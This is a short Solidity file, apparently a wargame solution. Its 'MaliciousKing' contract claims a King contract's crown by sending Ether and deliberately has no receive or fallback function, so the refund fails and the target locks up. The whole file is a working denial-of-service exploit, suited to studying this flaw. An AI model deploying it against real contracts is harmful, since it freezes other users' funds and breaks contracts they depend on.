// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King.sol";

contract MaliciousKing {
    // This function sends money to the King contract to steal the crown.
    function attack(address payable kingContract) external payable {
        // We use address(kingContract).call{value: msg.value}("")
        // to send our Ether and the trigger the King's receive function.
        (bool success,) = address(kingContract).call{value: msg.value}("");
        require(success, "Attack failed to take crown");
    }

    // WE do NOT include a receive() or fallback function.
    // Wheb the King contract tries to pay us back, we will reject it and crash!
}
